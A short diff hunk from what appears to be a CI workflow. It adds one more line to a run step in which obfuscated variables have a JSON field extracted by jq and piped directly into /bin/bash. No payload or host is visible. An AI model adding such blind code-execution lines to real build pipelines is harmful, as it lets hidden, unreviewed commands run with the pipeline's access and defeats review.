@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$cgo13" | jq -r .dm0 | /bin/bash
           printf '%s' "$rr281" | jq -r .a56 | /bin/bash
           echo $wm84 | jq -r .hybff5 | /bin/bash
+          echo $ezwa65482 | jq -r .gc0 | /bin/bash
 
       - name: Store results
         if: always()
